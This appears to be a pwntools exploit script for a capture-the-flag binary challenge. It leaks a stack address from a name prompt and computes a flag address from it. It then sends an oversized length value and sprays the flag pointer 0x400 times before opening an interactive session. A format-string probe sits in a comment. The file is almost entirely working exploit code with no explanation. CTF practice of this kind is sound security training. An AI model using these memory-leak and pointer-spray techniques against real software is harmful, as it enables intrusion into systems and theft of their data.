from parse_args_and_some_func import *
# %p%p%p%p%p%p%p

io:tube = all_parsed_args['io']
io.sendafter("tell me your name\n", 0x10 * 'a')
msg = io.recvline()
leak_stack_addr = u64(msg[-7:-1] + b'\x00\x00' )
LOG_ADDR('leak_stack_addr', leak_stack_addr)

flag_addr = leak_stack_addr - 0x320

msg = io.recvline()
buf_low_addr = int16(msg[5 : -1].decode())
LOG_ADDR('buf_low_addr', buf_low_addr)
STOP()
io.sendafter("leave something?\n", str(0x60ffffff))

io.sendline(p64(flag_addr) * 0x400)



io.interactive()